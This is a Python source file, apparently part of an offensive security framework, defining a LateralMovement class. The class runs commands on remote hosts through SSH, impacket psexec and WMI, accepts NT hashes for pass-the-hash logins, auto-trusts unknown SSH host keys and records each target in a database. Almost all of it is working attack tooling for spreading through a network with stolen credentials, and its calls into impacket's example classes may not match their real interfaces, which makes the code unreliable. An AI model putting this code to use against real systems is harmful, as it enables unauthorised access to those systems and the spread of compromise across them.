import paramiko
from impacket.smbconnection import SMBConnection
from impacket.examples.psexec import psexec
from impacket.examples.wmiexec import WMIEXEC
from .utils import log
from .database import db_session, Host, store_session

class LateralMovement:
    def __init__(self, target, username, password="", nt_hash="", domain=""):
        self.target=target; self.username=username; self.password=password; self.nt_hash=nt_hash; self.domain=domain
        with db_session() as db:
            host = db.query(Host).filter_by(ip_address=target).first()
            if not host: host = Host(ip_address=target); db.add(host); db.commit()
            self.host=host
    def ssh(self, command):
        client=paramiko.SSHClient(); client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(self.target, username=self.username, password=self.password, timeout=10)
            stdin, stdout, stderr = client.exec_command(command)
            out = stdout.read().decode()+stderr.read().decode(); client.close()
            return {"success":True, "output":out}
        except Exception as e: return {"success":False, "output":str(e)}
    def psexec(self, command):
        try:
            domain = self.domain or '.'
            username = self.username or 'guest'
            password = self.password or ''
            lmhash = ''
            nthash = self.nt_hash or ''
            executer = psexec(self.target, username, password, domain=domain, hashes=lmhash+':'+nthash)
            executer.run(command)
            return {"success": True, "output": executer.get_output()}
        except Exception as e: return {"success":False, "output":str(e)}
    def wmi(self, command):
        try:
            domain = self.domain or '.'
            executer = WMIEXEC(self.target, username=self.username, password=self.password, domain=domain, hashes=':'+self.nt_hash)
            executer.run(command)
            return {"success": True, "output": executer.get_output()}
        except Exception as e: return {"success":False, "output":str(e)}
